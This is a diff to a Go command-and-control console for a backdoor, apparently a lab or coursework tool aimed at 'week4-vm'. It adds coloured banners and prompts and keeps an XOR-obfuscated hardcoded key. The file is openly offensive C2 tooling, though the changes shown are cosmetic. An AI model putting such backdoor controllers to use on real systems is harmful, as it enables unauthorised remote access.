@@ -14,15 +14,32 @@ import (
 var scrambledKey = []byte{0x99, 0x15, 0xf5, 0x28, 0x9d, 0x15, 0xa7, 0x24, 0x9f, 0x12, 0xfb, 0x25, 0xca, 0x43, 0xf2, 0x23, 0xce, 0x47, 0xf5, 0x23, 0x9c, 0x40, 0xf4, 0x26, 0xc9, 0x40, 0xf5, 0x26, 0x9c, 0x47, 0xf4, 0x72, 0xca, 0x15, 0xa2, 0x29, 0x99, 0x17, 0xf5, 0x25, 0x9d, 0x16, 0xf4, 0x22, 0x9b, 0x43, 0xa1, 0x75, 0x99, 0x14, 0xfb, 0x22, 0xcc, 0x14, 0xa0, 0x29, 0xce, 0x11, 0xfb, 0x27, 0x9b, 0x11, 0xf7, 0x72}
 var xorKey = []byte{0xAF, 0x22, 0xC3, 0x11}
 
+const (
+	// Standard ANSI Colors
+	Reset  = "\033[0m"
+	Red    = "\033[31m"
+	Green  = "\033[32m"
+	Yellow = "\033[33m"
+	Blue   = "\033[34m"
+	Purple = "\033[35m"
+	Cyan   = "\033[36m"
+	Gray   = "\033[37m"
+
+	// Bold variants
+	BoldGreen = "\033[1;32m"
+	BoldCyan  = "\033[1;36m"
+)
+
 func main() {
 	key := string(encryption.XORTransform(scrambledKey, xorKey))
 	reader := bufio.NewReader(os.Stdin)
 
-	fmt.Println("--- Evil And Malicious Backdoor Console ---")
-	fmt.Println("Target: week4-vm | Protocol: GitHub + AES-GCM Encryption")
+	fmt.Printf("%s--- Super Evil Chud Hacker Console ---%s\n", BoldCyan, Reset)
+	fmt.Printf("%sTarget:%s week4-vm | %sProtocol:%s GitHub Backdoor\n", Gray, Green, Gray, Green)
 
 	for {
-		fmt.Print("c2 > ")
+		fmt.Printf("%s┌──(%shacker@week4%s)-[%s~%s]\n", Cyan, Red, Cyan, Gray, Cyan)
+		fmt.Printf("└─%s$ %s", Cyan, Reset)
 		input, _ := reader.ReadString('\n')
 		command := strings.TrimSpace(input)
 
@@ -56,7 +73,7 @@ func main() {
 			continue
 		}
 
-		fmt.Println("[*] Command sent. Waiting for agent check-in...")
+		fmt.Printf("%s[*]%s Command Sent. Waiting for Agent Check-in... ", Yellow, Reset)
 		waitForResult(encryptedPayload, timestamp, key)
 	}
 }
